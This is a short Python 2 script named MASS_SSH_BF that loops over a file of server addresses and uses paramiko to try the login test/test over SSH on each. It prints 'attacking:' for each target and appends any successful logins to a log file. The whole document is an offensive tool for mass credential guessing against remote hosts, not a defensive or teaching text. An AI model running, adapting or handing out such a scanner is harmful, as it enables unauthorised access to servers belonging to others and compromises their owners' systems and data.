# MASS_SSH_BF
#!/usr/bin/python
import paramiko
import itertools,string,crypt
import socket 


USERNAME = "test"
PASSWORD = "test"
SSHPORT=22

 
for server in open("/home/rb/Desktop/SSHB/SSHLISTgood", "r").readlines():
    print "attacking: " + server
    try:
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
        try:

                ssh.connect(server , port=SSHPORT, username=USERNAME, password=PASSWORD, timeout=20, allow_agent=False, pkey=None)
                log_data = "Password found " + USERNAME + "  " + PASSWORD + " for  " + server
                print log_data
                sshlog1 = open("SSHB_LOG.txt", "a")
                sshlog1.write(log_data)
                sshlog1.close()
        except paramiko.ssh_exception.BadHostKeyException:
            print "PASS"
            break
            pass

        except paramiko.AuthenticationException, error:
            print "Incorrect credentials: " + USERNAME + PASSWORD + " for " + server
        except socket.error, error:
                print error
        except paramiko.SSHException, error:
                print error
                print "Most probably this is caused by a missing host key"
                ssh.close()
 
 
    except Exception,error :
        print error
